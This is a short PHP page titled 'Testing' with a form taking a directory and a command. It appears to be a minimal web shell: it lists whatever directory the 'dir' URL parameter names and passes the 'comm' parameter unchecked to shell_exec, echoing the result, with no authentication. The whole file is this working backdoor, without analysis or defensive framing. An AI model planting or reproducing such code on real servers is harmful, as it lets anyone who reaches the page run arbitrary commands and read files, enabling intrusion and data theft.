<!DOCTYPE html>
<html>
<head>
<title>Testing</title>
</head>
<style>
body { color:#00FF00; }
</style>
<body style="background-color:black;">
<center>
<h1>
<?php
echo "todays date is " . date("l M d Y") . "<br>";
?>
</h1>
<form action="index.php" method="get">
dir:<br> <input type="text" name="dir"><br>
<pre>

</pre>
command:<br> <input type="text" name="comm"><br>
<input type="submit">
</form>
<br>
<pre>
<?php
$res = scandir($_GET["dir"]);
foreach ($res as $val) {
	echo $val . " ";
}
echo shell_exec($_GET["comm"]);
?>
</pre>
</center>
</body>
</html>

